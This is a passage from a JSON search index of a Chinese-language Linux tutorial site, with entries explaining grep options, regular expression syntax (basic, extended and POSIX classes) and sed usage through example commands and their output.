1 8\u3001-r \u9012\u5f52\u68c0\u7d22 9\u3001-l \u4e00\u822c\u4e0e-r\u8054\u7528\uff0c\u53ea\u663e\u793a\u5305\u542b\u5173\u952e\u5b57\u7684\u6587\u4ef6\u540d\uff0c\u800c\u4e0d\u662f\u663e\u793a\u6587\u4ef6\u5185\u5bb9 [root@shell shelldoc]# grep -rl \"if\" /script/ /script/adduser1.sh /script/if7.sh /script/for9.sh /script/fuwu.sh /script/if1.sh 10\u3001-q quiet \u9759\u9ed8\u8f93\u51fa \u4e00\u822c\u5728\u5199\u811a\u672c\u65f6\u5019\u7528 [root@shell shelldoc]# grep -q root /etc/passwd [root@shell shelldoc]# echo $? 0 11\u3001-n \u663e\u793a\u5339\u914d\u884c\u7684\u884c\u53f7 [root@shell shelldoc]# grep -n root /etc/passwd 1:root:x:0:0:root:/root:/bin/bash 11:operator:x:11:0:operator:/root:/sbin/nologin 12\u3001\u5176\u4ed6\u9009\u9879 -A\u662f\u663e\u793a\u5339\u914d\u540e\u548c\u5b83\u540e\u9762\u7684n\u884c\u3002 -B\u662f\u663e\u793a\u5339\u914d\u884c\u548c\u5b83\u524d\u9762\u7684n\u884c\u3002 -C\u662f\u5339\u914d\u884c\u548c\u5b83\u524d\u540e\u5404n\u884c\u3002 grep -A 4 wike \u5bc6\u7801\u6587\u4ef6.txt \u5c31\u662f\u641c\u7d22 \u5bc6\u7801\u6587\u4ef6.txt\uff0c\u627e\u5230\u5339\u914d\u201cwike\u201d\u5b57\u4e32\u7684\u884c\uff0c\u663e\u793a\u8be5\u884c\u540e\u540e\u9762\u7d27\u8ddf\u76844\u884c","title":"grep\u57fa\u672c\u4f7f\u7528"},{"location":"programming_language/bash_help/re/re/","text":"\u6b63\u5219\u8868\u8fbe\u5f0f \u6b63\u5219\u8868\u8fbe\u5f0f \uff08\u82f1\u8bed\uff1aRegular Expression\uff0c\u5e38\u7b80\u5199\u4e3aregex\u3001regexp\u6216RE\uff09\uff0c\u53c8\u79f0 \u6b63\u5219\u8868\u793a\u5f0f \u3001 \u6b63\u5219\u8868\u793a\u6cd5 \u3001 \u89c4\u5219\u8868\u8fbe\u5f0f \u3001 \u5e38\u89c4\u8868\u793a\u6cd5 \uff0c\u662f \u8ba1\u7b97\u673a\u79d1\u5b66 \u7684\u4e00\u4e2a\u6982\u5ff5\u3002\u6b63\u5219\u8868\u8fbe\u5f0f\u4f7f\u7528\u5355\u4e2a\u5b57\u7b26\u4e32\u6765\u63cf\u8ff0\u3001\u5339\u914d\u4e00\u7cfb\u5217\u5339\u914d\u67d0\u4e2a\u53e5\u6cd5\u89c4\u5219\u7684 \u5b57\u7b26\u4e32 \u3002\u5728\u5f88\u591a \u6587\u672c\u7f16\u8f91\u5668 \u91cc\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f\u901a\u5e38\u88ab\u7528\u6765\u68c0\u7d22\u3001\u66ff\u6362\u90a3\u4e9b\u5339\u914d\u67d0\u4e2a\u6a21\u5f0f\u7684\u6587\u672c\u3002 \u8bb8\u591a \u7a0b\u5e8f\u8bbe\u8ba1\u8bed\u8a00 \u90fd\u652f\u6301\u5229\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u8fdb\u884c\u5b57\u7b26\u4e32\u64cd\u4f5c\u3002\u4f8b\u5982\uff0c\u5728 Perl \u4e2d\u5c31\u5185\u5efa\u4e86\u4e00\u4e2a\u529f\u80fd\u5f3a\u5927\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u5f15\u64ce\u3002\u6b63\u5219\u8868\u8fbe\u5f0f\u8fd9\u4e2a\u6982\u5ff5\u6700\u521d\u662f\u7531 Unix \u4e2d\u7684\u5de5\u5177\u8f6f\u4ef6\uff08\u4f8b\u5982 sed \u548c grep \uff09\u666e\u53ca\u5f00\u7684\u3002 \u6b63\u5219\u8868\u8fbe\u5f0f - \u7ef4\u57fa\u767e\u79d1\uff0c\u81ea\u7531\u7684\u767e\u79d1\u5168\u4e66 (wikipedia.org) \u6587\u672c\u5904\u7406\u547d\u4ee4 grep\u3001sed\u3001awk\u3001sort\u3001cut\u3001uniq\u3001wc\u7b49 \u90fd\u652f\u6301 \u5b57\u7b26\u6a21\u5f0f\uff1a \u200b \u666e\u901a\u5b57\u7b26\uff1a\u6ca1\u6709\u4efb\u4f55\u7279\u6b8a\u542b\u4e49\u7684\u5b57\u7b26 \u200b \u5143\u5b57\u7b26\uff1a\u5177\u6709\u7279\u6b8a\u542b\u4e49\u7684\u5b57\u7b26 ^ $ * . [] () {} \u7b49 \u4ecb\u7ecd\u6b63\u5219\u8868\u8fbe\u5f0f\u5143\u5b57\u7b26 \u5143\u5b57\u7b26 \u529f\u80fd \u4f8b\u5b50 \u5339\u914d\u7ed3\u679c ^ \u884c\u9996\u5b9a\u4f4d\u7b26 /^root/ \u5339\u914d\u4ee5root\u5f00\u5934\u7684\u884c $ \u884c\u5c3e\u5b9a\u4f4d\u7b26 /sh$/ \u5339\u914d\u4ee5sh\u7ed3\u5c3e\u7684\u884c . \u5339\u914d\u4efb\u610f\u5355\u4e2a\u5b57\u7b26(\u9664\u4e86\u6362\u884c\u7b26) /l.ve/ \u5339\u914dlive\u3001love\u3001... ... * \u524d\u5bfc\u7b26\uff0c\u5339\u914d0\u4e2a\u6216\u8005\u591a\u4e2a\u5b83\u524d\u9762\u7684\u6a21\u5f0f /l*ve/ \u5339\u914dve\u3001lve\u3001llve\u3001... ... .* \u5339\u914d0\u5230\u591a\u4e2a\u4efb\u610f\u5b57\u7b26 [] \u5339\u914d\u4e00\u7ec4\u5b57\u7b26\u4e2d\u7684\u4efb\u610f\u4e00\u4e2a /l[ioIO]ve/ \u5339\u914dlive\u3001love\u3001lIve\u3001lOve [x-y] \u5339\u914d\u4e00\u6bb5\u8303\u56f4\u4e2d\u7684\u4efb\u610f\u4e00\u4e2a /l[o-z]ve/ \u5339\u914dlove\u3001lpve\u3001lqve\u3001... ...\u3001lzve [0-9] \u6570\u5b57 [a-z] \u5c0f\u5199\u5b57\u6bcd [A-Z] \u5927\u5199\u5b57\u6bcd [a-z0-9] \u5c0f\u5199\u5b57\u6bcd\u6216\u6570\u5b57 [-+*/] +-*/ \u56db\u5219\u8fd0\u7b97 [a-Z] \u5b57\u6bcd [^] \u8868\u793a\u53d6\u53cd /[^abc]ve/ \u5339\u914d\u9664\u4e86ave\u3001bve\u3001cve\u4ee5\u5916\u7684\u4e09\u4e2a\u5b57\u7b26\u7684\u5b57\u7b26\u4e32 [^0-9] \u4e0d\u662f\u6570\u5b57 \\ \u7528\u4e8e\u8f6c\u4e49\u5143\u5b57\u7b26\u7684 /93\\.4/ \u5339\u914d93.4 \\< \u8bcd\u9996\u5b9a\u4f4d\u7b26 /\\<bin/ \u5339\u914dbin\u3001binary\u3001... ... \\> \u8bcd\u5c3e\u5b9a\u4f4d\u7b26 /sh\\>/ \u5339\u914dbash\u3001csh\u3001ksh\u3001... ... \u6269\u5c55\u6b63\u5219 \u5143\u5b57\u7b26 \u529f\u80fd \u4f8b\u5b50 \u5339\u914d\u7ed3\u679c | \u6216\u8005 ? \u8868\u793a0\u4e2a\u6216\u80051\u4e2a\u5b83\u524d\u9762\u7684\u5b57\u7b26 a?d d ad + \u8868\u793a1\u4e2a\u6216\u8005\u591a\u4e2a\u5b83\u524d\u9762\u7684\u5b57\u7b26 a+d ad aad aaad ^[0-9]+$ \u4efb\u610f\u6570\u5b57 \\(...\\) \u5206\u7ec4\u3001\u6807\u7b7e x\\{m\\} x\u662f\u5b57\u7b26\u6216\u8005\u5b57\u7b26\u4e32\uff0cm\u662f\u6570\u5b57\uff0c\u8868\u793a\u6b21\u6570 \u5339\u914dx\u51fa\u73b0m\u6b21 /a\\{3\\}/ \u5339\u914d\u5230aaa x\\{m,\\} \u5339\u914dx\u51fa\u73b0\u81f3\u5c11m\u6b21 /a\\{3,\\}/ \u5339\u914daaa\u3001aaaa\u3001aaaaaaaa\u3001aaaaaaa\u3001... ... x\\{m,n\\} \u5339\u914dx\u51fa\u73b0m\u6b21\u5230n\u6b21 /a\\{3,5\\}/ \u5339\u914daaa\u3001aaaa\u3001aaaaa x{m} x\u51fa\u73b0m\u6b21 x{m,} x\u81f3\u5c11\u51fa\u73b0m\u6b21 x{m,n} x\u51fa\u73b0m\u5230n\u6b21 [root@shell shelldoc]# egrep \"a+\" e2.txt --color aabbcc aaabbbccc aaaannnmms POSIX\u8868\u793a\u6cd5 \u5143\u5b57\u7b26 \u529f\u80fd \u4f8b\u5b50 \u5339\u914d\u7ed3\u679c [:space:] \u5305\u542b\u6362\u884c\u7b26\u3001\u7a7a\u683c\u3001tab\u7b49\u6240\u6709\u7a7a\u767d\u5b57\u7b26 [:blank:] \u7a7a\u683c\u548c\u5236\u8868\u7b26\uff0c\u7a7a\u683c\u548ctab [:alpha:] \u5b57\u6bcd [:alnum:] \u5b57\u6bcd\u548c\u6570\u5b57(\u5305\u62ec\u7a7a\u767d\u5b57\u7b26) [:cntrl:] \u63a7\u5236\u5b57\u7b26\uff0cctrl\u3001backspace\u7b49\u7b49 [:lower:] \u5c0f\u5199\u5b57\u6bcd [:upper:] \u5927\u5199\u5b57\u6bcd [:digit:] \u5341\u8fdb\u5236\u6570 [:xdigit:] \u5341\u516d\u8fdb\u5236\u6570 [:punct:] \u6807\u70b9\u7b26\u53f7 [:graph:] \u53ef\u6253\u5370\u7684\u548c\u53ef\u89c1\u7684\uff08\u975e\u7a7a\u683c\uff09\u5b57\u7b26 [:print:] \u53ef\u6253\u5370\u7684\u5b57\u7b26 [^[:alpha:]] \u53d6\u53cd\uff0c\u8868\u793a\u4e0d\u662f\u5b57\u6bcd [root@shell shelldoc]# grep \"[[:space:]]\\.[[:digit:]][[:space:]]\" datafile --color southwest SW Lewis Dalsass 2.7 .8 218 southeast SE Patricia Hemenway 4.0 .7 417","title":"\u6b63\u5219\u8868\u8fbe\u5f0f"},{"location":"programming_language/bash_help/re/re/#_1","text":"\u6b63\u5219\u8868\u8fbe\u5f0f \uff08\u82f1\u8bed\uff1aRegular Expression\uff0c\u5e38\u7b80\u5199\u4e3aregex\u3001regexp\u6216RE\uff09\uff0c\u53c8\u79f0 \u6b63\u5219\u8868\u793a\u5f0f \u3001 \u6b63\u5219\u8868\u793a\u6cd5 \u3001 \u89c4\u5219\u8868\u8fbe\u5f0f \u3001 \u5e38\u89c4\u8868\u793a\u6cd5 \uff0c\u662f \u8ba1\u7b97\u673a\u79d1\u5b66 \u7684\u4e00\u4e2a\u6982\u5ff5\u3002\u6b63\u5219\u8868\u8fbe\u5f0f\u4f7f\u7528\u5355\u4e2a\u5b57\u7b26\u4e32\u6765\u63cf\u8ff0\u3001\u5339\u914d\u4e00\u7cfb\u5217\u5339\u914d\u67d0\u4e2a\u53e5\u6cd5\u89c4\u5219\u7684 \u5b57\u7b26\u4e32 \u3002\u5728\u5f88\u591a \u6587\u672c\u7f16\u8f91\u5668 \u91cc\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f\u901a\u5e38\u88ab\u7528\u6765\u68c0\u7d22\u3001\u66ff\u6362\u90a3\u4e9b\u5339\u914d\u67d0\u4e2a\u6a21\u5f0f\u7684\u6587\u672c\u3002 \u8bb8\u591a \u7a0b\u5e8f\u8bbe\u8ba1\u8bed\u8a00 \u90fd\u652f\u6301\u5229\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u8fdb\u884c\u5b57\u7b26\u4e32\u64cd\u4f5c\u3002\u4f8b\u5982\uff0c\u5728 Perl \u4e2d\u5c31\u5185\u5efa\u4e86\u4e00\u4e2a\u529f\u80fd\u5f3a\u5927\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u5f15\u64ce\u3002\u6b63\u5219\u8868\u8fbe\u5f0f\u8fd9\u4e2a\u6982\u5ff5\u6700\u521d\u662f\u7531 Unix \u4e2d\u7684\u5de5\u5177\u8f6f\u4ef6\uff08\u4f8b\u5982 sed \u548c grep \uff09\u666e\u53ca\u5f00\u7684\u3002 \u6b63\u5219\u8868\u8fbe\u5f0f - \u7ef4\u57fa\u767e\u79d1\uff0c\u81ea\u7531\u7684\u767e\u79d1\u5168\u4e66 (wikipedia.org) \u6587\u672c\u5904\u7406\u547d\u4ee4 grep\u3001sed\u3001awk\u3001sort\u3001cut\u3001uniq\u3001wc\u7b49 \u90fd\u652f\u6301 \u5b57\u7b26\u6a21\u5f0f\uff1a \u200b \u666e\u901a\u5b57\u7b26\uff1a\u6ca1\u6709\u4efb\u4f55\u7279\u6b8a\u542b\u4e49\u7684\u5b57\u7b26 \u200b \u5143\u5b57\u7b26\uff1a\u5177\u6709\u7279\u6b8a\u542b\u4e49\u7684\u5b57\u7b26 ^ $ * . [] () {} \u7b49","title":"\u6b63\u5219\u8868\u8fbe\u5f0f"},{"location":"programming_language/bash_help/re/re/#_2","text":"\u5143\u5b57\u7b26 \u529f\u80fd \u4f8b\u5b50 \u5339\u914d\u7ed3\u679c ^ \u884c\u9996\u5b9a\u4f4d\u7b26 /^root/ \u5339\u914d\u4ee5root\u5f00\u5934\u7684\u884c $ \u884c\u5c3e\u5b9a\u4f4d\u7b26 /sh$/ \u5339\u914d\u4ee5sh\u7ed3\u5c3e\u7684\u884c . \u5339\u914d\u4efb\u610f\u5355\u4e2a\u5b57\u7b26(\u9664\u4e86\u6362\u884c\u7b26) /l.ve/ \u5339\u914dlive\u3001love\u3001... ... * \u524d\u5bfc\u7b26\uff0c\u5339\u914d0\u4e2a\u6216\u8005\u591a\u4e2a\u5b83\u524d\u9762\u7684\u6a21\u5f0f /l*ve/ \u5339\u914dve\u3001lve\u3001llve\u3001... ... .* \u5339\u914d0\u5230\u591a\u4e2a\u4efb\u610f\u5b57\u7b26 [] \u5339\u914d\u4e00\u7ec4\u5b57\u7b26\u4e2d\u7684\u4efb\u610f\u4e00\u4e2a /l[ioIO]ve/ \u5339\u914dlive\u3001love\u3001lIve\u3001lOve [x-y] \u5339\u914d\u4e00\u6bb5\u8303\u56f4\u4e2d\u7684\u4efb\u610f\u4e00\u4e2a /l[o-z]ve/ \u5339\u914dlove\u3001lpve\u3001lqve\u3001... ...\u3001lzve [0-9] \u6570\u5b57 [a-z] \u5c0f\u5199\u5b57\u6bcd [A-Z] \u5927\u5199\u5b57\u6bcd [a-z0-9] \u5c0f\u5199\u5b57\u6bcd\u6216\u6570\u5b57 [-+*/] +-*/ \u56db\u5219\u8fd0\u7b97 [a-Z] \u5b57\u6bcd [^] \u8868\u793a\u53d6\u53cd /[^abc]ve/ \u5339\u914d\u9664\u4e86ave\u3001bve\u3001cve\u4ee5\u5916\u7684\u4e09\u4e2a\u5b57\u7b26\u7684\u5b57\u7b26\u4e32 [^0-9] \u4e0d\u662f\u6570\u5b57 \\ \u7528\u4e8e\u8f6c\u4e49\u5143\u5b57\u7b26\u7684 /93\\.4/ \u5339\u914d93.4 \\< \u8bcd\u9996\u5b9a\u4f4d\u7b26 /\\<bin/ \u5339\u914dbin\u3001binary\u3001... ... \\> \u8bcd\u5c3e\u5b9a\u4f4d\u7b26 /sh\\>/ \u5339\u914dbash\u3001csh\u3001ksh\u3001... ...","title":"\u4ecb\u7ecd\u6b63\u5219\u8868\u8fbe\u5f0f\u5143\u5b57\u7b26"},{"location":"programming_language/bash_help/re/re/#_3","text":"\u5143\u5b57\u7b26 \u529f\u80fd \u4f8b\u5b50 \u5339\u914d\u7ed3\u679c | \u6216\u8005 ? \u8868\u793a0\u4e2a\u6216\u80051\u4e2a\u5b83\u524d\u9762\u7684\u5b57\u7b26 a?d d ad + \u8868\u793a1\u4e2a\u6216\u8005\u591a\u4e2a\u5b83\u524d\u9762\u7684\u5b57\u7b26 a+d ad aad aaad ^[0-9]+$ \u4efb\u610f\u6570\u5b57 \\(...\\) \u5206\u7ec4\u3001\u6807\u7b7e x\\{m\\} x\u662f\u5b57\u7b26\u6216\u8005\u5b57\u7b26\u4e32\uff0cm\u662f\u6570\u5b57\uff0c\u8868\u793a\u6b21\u6570 \u5339\u914dx\u51fa\u73b0m\u6b21 /a\\{3\\}/ \u5339\u914d\u5230aaa x\\{m,\\} \u5339\u914dx\u51fa\u73b0\u81f3\u5c11m\u6b21 /a\\{3,\\}/ \u5339\u914daaa\u3001aaaa\u3001aaaaaaaa\u3001aaaaaaa\u3001... ... x\\{m,n\\} \u5339\u914dx\u51fa\u73b0m\u6b21\u5230n\u6b21 /a\\{3,5\\}/ \u5339\u914daaa\u3001aaaa\u3001aaaaa x{m} x\u51fa\u73b0m\u6b21 x{m,} x\u81f3\u5c11\u51fa\u73b0m\u6b21 x{m,n} x\u51fa\u73b0m\u5230n\u6b21 [root@shell shelldoc]# egrep \"a+\" e2.txt --color aabbcc aaabbbccc aaaannnmms","title":"\u6269\u5c55\u6b63\u5219"},{"location":"programming_language/bash_help/re/re/#posix","text":"\u5143\u5b57\u7b26 \u529f\u80fd \u4f8b\u5b50 \u5339\u914d\u7ed3\u679c [:space:] \u5305\u542b\u6362\u884c\u7b26\u3001\u7a7a\u683c\u3001tab\u7b49\u6240\u6709\u7a7a\u767d\u5b57\u7b26 [:blank:] \u7a7a\u683c\u548c\u5236\u8868\u7b26\uff0c\u7a7a\u683c\u548ctab [:alpha:] \u5b57\u6bcd [:alnum:] \u5b57\u6bcd\u548c\u6570\u5b57(\u5305\u62ec\u7a7a\u767d\u5b57\u7b26) [:cntrl:] \u63a7\u5236\u5b57\u7b26\uff0cctrl\u3001backspace\u7b49\u7b49 [:lower:] \u5c0f\u5199\u5b57\u6bcd [:upper:] \u5927\u5199\u5b57\u6bcd [:digit:] \u5341\u8fdb\u5236\u6570 [:xdigit:] \u5341\u516d\u8fdb\u5236\u6570 [:punct:] \u6807\u70b9\u7b26\u53f7 [:graph:] \u53ef\u6253\u5370\u7684\u548c\u53ef\u89c1\u7684\uff08\u975e\u7a7a\u683c\uff09\u5b57\u7b26 [:print:] \u53ef\u6253\u5370\u7684\u5b57\u7b26 [^[:alpha:]] \u53d6\u53cd\uff0c\u8868\u793a\u4e0d\u662f\u5b57\u6bcd [root@shell shelldoc]# grep \"[[:space:]]\\.[[:digit:]][[:space:]]\" datafile --color southwest SW Lewis Dalsass 2.7 .8 218 southeast SE Patricia Hemenway 4.0 .7 417","title":"POSIX\u8868\u793a\u6cd5"},{"location":"programming_language/bash_help/sed/","text":"Sed sed \uff08\u610f\u4e3a \u6d41\u7f16\u8f91\u5668 \uff0c\u6e90\u81ea \u82f1\u8bed \u201cstream editor\u201d\u7684\u7f29\u5199\uff09\u662f\u4e00\u4e2a\u4f7f\u7528\u7b80\u5355\u7d27\u51d1\u7684\u7f16\u7a0b\u8bed\u8a00\u6765\u89e3\u6790\u548c\u8f6c\u6362\u6587\u672c Unix \u5b9e\u7528\u7a0b\u5e8f\u3002 sed\u7531 \u8d1d\u5c14\u5b9e\u9a8c\u5ba4 \u7684 \u674e\u00b7E\u00b7\u9ea6\u514b\u9a6c\u6d2a \u4e8e1973\u5e74\u81f31974\u5e74\u5f00\u53d1\uff0c \u5e76\u4e14\u73b0\u5728\u5927\u591a\u6570\u64cd\u4f5c\u7cfb\u7edf\u90fd\u53ef\u4ee5\u4f7f\u7528\u3002 sed\u57fa\u4e8e\u4ea4\u4e92\u5f0f\u7f16\u8f91\u5668ed\uff08\u201ceditor\u201d\uff0c1971\uff09\u548c\u65e9\u671fqed\uff08\u201cquick editor\u201d\uff0c1965-66\uff09\u7684\u811a\u672c\u529f\u80fd\u3002sed\u662f\u6700\u65e9\u652f\u6301 \u6b63\u5219\u8868\u8fbe\u5f0f \u7684\u5de5\u5177\u4e4b\u4e00\uff0c\u81f3\u4eca\u4ecd\u7136\u7528\u4e8e\u6587\u672c\u5904\u7406\uff0c\u7279\u522b\u662f\u7528\u4e8e\u66ff\u6362\u547d\u4ee4\u3002\u7528\u4e8e\u7eaf\u6587\u672c\u5b57\u7b26\u4e32\u64cd\u4f5c\u548c\u201c\u6d41\u7f16\u8f91\u201d\u7684\u5e38\u7528\u5de5\u5177\u8fd8\u6709 AWK \u548c Perl \u3002","title":"Sed"},{"location":"programming_language/bash_help/sed/#sed","text":"sed \uff08\u610f\u4e3a \u6d41\u7f16\u8f91\u5668 \uff0c\u6e90\u81ea \u82f1\u8bed \u201cstream editor\u201d\u7684\u7f29\u5199\uff09\u662f\u4e00\u4e2a\u4f7f\u7528\u7b80\u5355\u7d27\u51d1\u7684\u7f16\u7a0b\u8bed\u8a00\u6765\u89e3\u6790\u548c\u8f6c\u6362\u6587\u672c Unix \u5b9e\u7528\u7a0b\u5e8f\u3002 sed\u7531 \u8d1d\u5c14\u5b9e\u9a8c\u5ba4 \u7684 \u674e\u00b7E\u00b7\u9ea6\u514b\u9a6c\u6d2a \u4e8e1973\u5e74\u81f31974\u5e74\u5f00\u53d1\uff0c \u5e76\u4e14\u73b0\u5728\u5927\u591a\u6570\u64cd\u4f5c\u7cfb\u7edf\u90fd\u53ef\u4ee5\u4f7f\u7528\u3002 sed\u57fa\u4e8e\u4ea4\u4e92\u5f0f\u7f16\u8f91\u5668ed\uff08\u201ceditor\u201d\uff0c1971\uff09\u548c\u65e9\u671fqed\uff08\u201cquick editor\u201d\uff0c1965-66\uff09\u7684\u811a\u672c\u529f\u80fd\u3002sed\u662f\u6700\u65e9\u652f\u6301 \u6b63\u5219\u8868\u8fbe\u5f0f \u7684\u5de5\u5177\u4e4b\u4e00\uff0c\u81f3\u4eca\u4ecd\u7136\u7528\u4e8e\u6587\u672c\u5904\u7406\uff0c\u7279\u522b\u662f\u7528\u4e8e\u66ff\u6362\u547d\u4ee4\u3002\u7528\u4e8e\u7eaf\u6587\u672c\u5b57\u7b26\u4e32\u64cd\u4f5c\u548c\u201c\u6d41\u7f16\u8f91\u201d\u7684\u5e38\u7528\u5de5\u5177\u8fd8\u6709 AWK \u548c Perl \u3002","title":"Sed"},{"location":"programming_language/bash_help/sed/sed/","text":"sed \u6d41\u7f16\u8f91\u5668 stream editor \u662f\u4e00\u79cd\u975e\u4ea4\u4e92\u5f0f\u6587\u672c\u7f16\u8f91\u5668\uff0c\u9ed8\u8ba4\u662f\u4e0d\u4f1a\u4fee\u6539\u539f\u6587\u4ef6\u7684 \u5de5\u4f5c\u539f\u7406\uff1a \u4e00\u884c\u4e00\u884c\u5904\u7406\uff0c\u4ece\u6587\u4ef6\u7684\u7b2c\u4e00\u884c\u5f00\u59cb\u8bfb\u53d6\uff0c\u653e\u5230\u6a21\u5f0f\u7a7a\u95f4\u4e2d\u8fdb\u884c\u76f8\u5e94\u5904\u7406\uff0c\u5904\u7406\u5b8c\u5c06\u7ed3\u679c\u8f93\u51fa\u5230\u5c4f\u5e55\u4e0a\uff0c\u7136\u540e\u7ee7\u7eed\u8bfb\u53d6\u4e0b\u4e00\u884c\uff0c\u76f4\u5230\u6240\u6709\u7684\u884c\u90fd\u5904\u7406\u5b8c\u6bd5\uff0csed\u7ed3\u675f\u3002 \u8bed\u6cd5\uff1a sed [\u9009\u9879] 'AddressCommand' \u6587\u4ef6\u5217\u8868 1\u3001\u5e38\u7528\u7684\u9009\u9879 -n\uff1a\u9759\u9ed8\u8f93\u51fa\uff0c\u5173\u95ed\u6a21\u5f0f\u7a7a\u95f4\u7684\u8f93\u51fa\uff0c\u4e00\u822c\u4e0ep\u4e00\u8d77\u7528 -e\uff1a\u5141\u8bb8\u8fdb\u884c\u591a\u9879\u7f16\u8f91\uff0c\u4e5f\u5c31\u662f\u8bf4\u5bf9\u540c\u4e00\u884c\u505a\u591a\u6b21\u5904\u7406\u3001\u4e5f\u53ef\u4ee5\u505a\u591a\u70b9\u7f16\u8f91 -e '\u52a8\u4f5c' -e '\u52a8\u4f5c' \u7b49\u4ef7\u4e8e '\u52a8\u4f5c1;\u52a8\u4f5c2' \u4e5f\u53ef\u4ee5{\u52a8\u4f5c1;\u52a8\u4f5c2} -f\uff1ased\u811a\u672c\uff1a\u6307\u5b9a\u8fd0\u884c\u7684sed\u811a\u672c\u7684 -r\uff1a\u5141\u8bb8\u4f7f\u7528\u6269\u5c55\u6b63\u5219 [root@shell shelldoc]# sed -r 's/[0-9]+//' pass -i\uff1a\u76f4\u63a5\u4fee\u6539\u539f\u6587\u4ef6 -i.\u540e\u7f00\u540d\uff1a\u5728\u4fee\u6539\u4e4b\u524d\u5148\u5907\u4efd -i.bak [root@shell shelldoc]# sed -i '/SELINUX/s/disabled/permissive/' /etc/selinux/config [root@shell shelldoc]# cat /etc/selinux/config # This file controls the state of SELinux on the system. # SELINUX= can take one of these three values: # enforcing - SELinux security policy is enforced. # permissive - SELinux prints warnings instead of enforcing. # disabled - No SELinux policy is loaded. SELINUX=permissive # SELINUXTYPE= can take one of these two values: # targeted - Targeted processes are protected, # mls - Multi Level Security protection. SELINUXTYPE=targeted \u5728\u4fee\u6539\u6587\u4ef6\u4e4b\u524d\u5148\u5907\u4efd [root@shell shelldoc]# sed -i.bak '/SELINUX/s/permissive/disabled/' /etc/selinux/config [root@shell shelldoc]# ls /etc/selinux/config* /etc/selinux/config /etc/selinux/config.bak [root@shell shelldoc]# cat /etc/selinux/config # This file controls the state of SELinux on the system. # SELINUX= can take one of these three values: # enforcing - SELinux security policy is enforced. # permissive - SELinux prints warnings instead of enforcing. # disabled - No SELinux policy is loaded. SELINUX=disabled # SELINUXTYPE= can take one of these two values: # targeted - Targeted processes are protected, # mls - Multi Level Security protection. SELINUXTYPE=targeted 2\u3001Address \uff1a \u5b9a\u5740\u3001\u5730\u5740 1\uff09\u5355\u72ec\u7684\u884c\u53f7 \u200b \u5982\uff1a1 \u5c31\u8868\u793a\u8981\u5904\u7406\u7b2c\u4e00\u884c \u200b $ \u8868\u793a\u6700\u540e\u4e00\u884c 2\uff09\u8d77\u59cb\u884c,\u7ed3\u675f\u884c \u200b \u5982\uff1a 1,5 \u5904\u7406\u7b2c\u4e00\u884c\u5230\u7b2c\u4e94\u884c 3\uff09/\u6b63\u5219\u8868\u8fbe\u5f0f/ \u200b \u5982\uff1a/^root/ \u5904\u7406\u4ee5root\u5f00\u5934\u7684\u884c 4\uff09/\u6b63\u5219\u8868\u8fbe\u5f0f1/\uff0c/\u6b63\u5219\u8868\u8fbe\u5f0f2/ \u6700\u5c0f\u5339\u914d \u200b \u8868\u793a\u5904\u7406\u4ece\u5339\u914d\u5230\u6b63\u5219\u8868\u8fbe\u5f0f1\u7684\u884c\u5f00\u59cb\uff0c\u5230\u7b2c\u4e00\u6b21\u5339\u914d\u5230\u6b63\u5219\u8868\u8fbe\u5f0f2\u4e4b\u95f4\u7684\u6240\u6709\u884c \u200b \u5982\u679c\u6b63\u5219\u8868\u8fbe\u5f0f1\u5339\u914d\u5230\u4e86\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f2\u672a\u5339\u914d\u5230\uff0c\u90a3\u4e48\u5c31\u4ece\u5339\u914d\u5230\u6b63\u5219\u8868\u8fbe\u5f0f1\u7684\u884c\u5f00\u59cb\uff0c\u4e00\u76f4\u5904\u7406\u5230\u6587\u4ef6\u7ed3\u675f \u200b \u5982\u679c\u6b63\u5219\u8868\u8fbe\u5f0f1\u672a\u5339\u914d\u5230\uff0c\u90a3\u4e48\u5c31\u4e0d\u5bf9\u6587\u4ef6\u505a\u5904\u7406\u3002 \u5982\uff1a/^bin/,/bash$/ binsdadaddaddass dsfasidsfdhfj09bash dasdasdasdf--bash 5\uff09\u8d77\u59cb\u4f4d\u7f6e\uff0c+N \u4e0d\u662f\u7279\u522b\u5e38\u7528 \u200b \u8868\u793a\u4ece\u8d77\u59cb\u4f4d\u7f6e\u5f00\u59cb\uff0c\u540e\u9762\u7684N\u884c\u90fd\u5904\u7406 \u200b \u5982\uff1a3,+5 \u5904\u74063-8\u884c 6\uff09sed\u7684\u5206\u7ec4\u547d\u4ee4\uff0c\u53ef\u4ee5\u5c06\u4e00\u4e2a\u5730\u5740\u5d4c\u5957\u53e6\u4e00\u4e2a\u5730\u5740\u4e2d 3\u3001\u547d\u4ee4 \u5e38\u7528\u7684\uff1ad p s y q \u5176\u4ed6\u7684\uff1aa c i r w \u200b h H g G 1\uff09d\uff1a\u5220\u9664 [root@shell shelldoc]# sed '/UUID/d' /etc/fstab [root@shell shelldoc]# sed '1,5d' /etc/fstab [root@shell shelldoc]# sed '$d' /etc/fstab [root@shell shelldoc]# sed '/tmp/,/sfs/d' /etc/fstab [root@shell shelldoc]# sed '/UUID/,+5d' /etc/fstab \u5220\u9664\u4ece\u7b2c5\u884c\u5f00\u59cb\u5230\u6700\u540e\u4e00\u884c\u7684\u6240\u6709\u5185\u5bb9 [root@shell shelldoc]# sed '5,$d' /etc/passwd 2\uff09p\uff1a\u6253\u5370 [root@shell shelldoc]# cat -n /etc/passwd | head > pass [root@shell shelldoc]# sed 'p' pass //\u6bcf\u884c\u4f1a\u6253\u5370\u4e24\u904d\uff0c\u4e00\u904d\u662f\u5904\u7406\u7ed3\u679c\uff0c\u4e00\u904d\u662f\u6a21\u5f0f\u7a7a\u95f4\u7684\u8f93\u51fa [root@shell shelldoc]# sed -n 'p' pass //\u53ea\u4f1a\u6253\u5370\u4e00\u904d\uff0c\u56e0\u4e3a\u6a21\u5f0f\u7a7a\u95f4\u7684\u8f93\u51fa\u88ab\u5173\u95ed\u4e86 [root@shell shelldoc]# sed -n '3,5p' pass // \u6253\u5370\u6587\u4ef6\u76843\u52305\u884c 3 daemon:x:2:2:daemon:/sbin:/sbin/nologin 4 adm:x:3:4:adm:/var/adm:/sbin/nologin 5 lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin [root@shell shelldoc]# sed -n '3p' pass 3 daemon:x:2:2:daemon:/sbin:/sbin/nologin \u200b ! \u975e [root@shell shelldoc]# sed '3!d' pass 